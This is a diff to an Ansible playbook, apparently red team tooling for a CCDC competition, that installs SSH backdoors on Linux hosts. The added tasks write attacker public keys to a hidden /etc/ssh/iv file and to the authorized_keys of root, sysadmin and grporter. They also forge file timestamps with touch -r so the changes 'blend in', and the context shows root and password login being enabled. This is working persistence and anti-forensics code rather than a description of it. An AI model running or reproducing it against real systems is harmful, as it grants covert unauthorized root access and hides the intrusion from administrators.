@@ -1,7 +1,7 @@
 - name: ssh keys place
   hosts: linux
   become: true
-  become_method: enable
+  #become_method: enable
   ignore_errors: true
   tasks:
     - name: Allow password-based login and permit root login
@@ -22,14 +22,66 @@
         regexp: '^.*AuthorizedKeysFile.*$'
         line: 'AuthorizedKeysFile /etc/ssh/iv /root/.ssh/authorized_keys /home/%u/.ssh/authorized_keys'
 
-    - name: Write the redteam pubkey to /etc/ssh/iv
+    - name: Write the ivbackdoor pubkey to /etc/ssh/iv
       copy:
         content: |
-          ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZhA5bPlE7Q2ILlNlL/YI6hTvrZfpM1HyxCH7312PnM4l916KpeSzr7oNXNWUqoU6+OKvq44R+5iRw1dG4eXRl/pm1dZZVGJFLZzZArQi1ZwvSwizEOAN6kDQBqT+Zo3NC3AUdu7zZ3tUCEsa8N64gWqIkgGL7/mtXDgMSUb+xL41TRWiOroiz/Djj016b9weNSSEwRvQK8fKkf6vuua3uejpHdQ/2o2BZA8ITZCS6oikib9UFaXp4A5B9PaBzR5Ha8GhSP6BNcZwt25bT15NsFUXk4WfZjk4/bzQCNzSdv1zqakedbmwNnhxEr+1UytftEw1fmOFTo+hVEc/KldHKKEkO+1tnAFQsJoAwtjFLX5MtZBHzN8Y89jLCf6LMrr3TfjRnB0C2oK/21Z6HK47AjS54ovXUwgNpIG1LtWbj1Nhi6vd+RteH4pIfctG8oTBXFcqwl7gGJsf1HofsVxkAw54RYhdNKHZTaddEH7jzWoq2i0jj9g+0nhYTm85IxQE=
+          ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8MC+aXwkJNbcvu5aIQ/iXcvcvwl9y3eYE+TntYvhBc scoring@ccdc
         dest: /etc/ssh/iv
         owner: root
         group: root
         mode: '0644'
+
+    - name: Modify timestamp of iv to blend in 
+      ansible.legacy.shell: |
+          touch -r /etc/ssh/moduli /etc/ssh/iv
+      args:
+        executable: /bin/bash
+
+    - name: Add ssh key to root's authorized_keys file
+      ansible.legacy.shell: |
+        if ! test -d /root/.ssh; then
+            mkdir /root/.ssh
+        fi
+        if ! test -f /root/.ssh/authorized_keys || ! grep -q kQgUxh36 /root/.ssh/authorized_keys; then
+          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILINPfZ8GuoF3Y+ge21PAwh42X+tcO+75py4kQgUXh36 root' >> /root/.ssh/authorized_keys
+          chown root.root /root/.ssh/authorized_keys 
+          chmod 600 /root/.ssh/authorized_keys
+          touch -r /root/.bashrc /root/.ssh/authorized_keys 
+        fi
+      args:
+        executable: /bin/bash
+
+    - name: Add ssh key to sysadmin (if exists)
+      ansible.legacy.shell: |
+        if test -d /home/sysadmin; then
+          if ! test -d /home/sysadmin/.ssh/ || ! test -d /home/sysadmin/.ssh/authorized_keys; then
+            mkdir /home/sysadmin/.ssh
+            chown sysadmin.sysadmin /home/sysadmin/.ssh
+            echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBNBv5fwG83k6HnDqFmUlnaagIh2HUP+jruIIVhqQnTE sysadmin' >> /home/sysadmin/.ssh/authorized_keys
+            chown sysadmin.sysadmin /home/sysadmin/.ssh/authorized_keys 
+            chmod 600 /home/sysadmin/.ssh/authorized_keys
+            touch -r /home/sysadmin/.bashrc /home/sysadmin/.ssh 
+            touch -r /home/sysadmin/.bashrc /home/sysadmin/.ssh/authorized_keys 
+          fi
+        fi
+      args:
+        executable: /bin/bash
+
+    - name: Add ssh key to grporter (if exists, just for Fed21)
+      ansible.legacy.shell: |
+        if test -d /home/grporter; then
+          if ! test -d /home/grporter/.ssh/ || ! test -d /home/grporter/.ssh/authorized_keys; then
+            mkdir /home/grporter/.ssh
+            chown grporter.grporter /home/grporter/.ssh
+            echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBNBv5fwG83k6HnDqFmUlnaagIh2HUP+jruIIVhqQnTE grporter' >> /home/grporter/.ssh/authorized_keys
+            chown grporter.grporter /home/grporter/.ssh/authorized_keys 
+            chmod 600 /home/grporter/.ssh/authorized_keys
+            touch -r /home/grporter/.bashrc /home/grporter/.ssh 
+            touch -r /home/grporter/.bashrc /home/grporter/.ssh/authorized_keys 
+          fi
+        fi
+      args:
+        executable: /bin/bash
 
     - name: Restart ssh service
       service:
